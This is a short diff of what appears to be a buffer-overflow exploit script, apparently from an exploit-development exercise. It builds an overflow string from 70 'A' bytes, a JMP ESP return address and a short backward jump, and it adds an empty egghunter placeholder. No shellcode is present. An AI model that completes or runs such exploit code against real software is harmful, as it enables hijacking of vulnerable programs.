@@ -14,6 +14,10 @@ JMP_ESP = "\xaf\x11\x50\x62"
 #EBB8
 JMP_70_BACK = "\xEB\xB8" # Nasm Shell
 
+egghunter = b""
+
+
+
 #evilString = cyclic_pattern
 evilString = "A"*70 + JMP_ESP + JMP_70_BACK + "C"*(256-4-7-4)
 
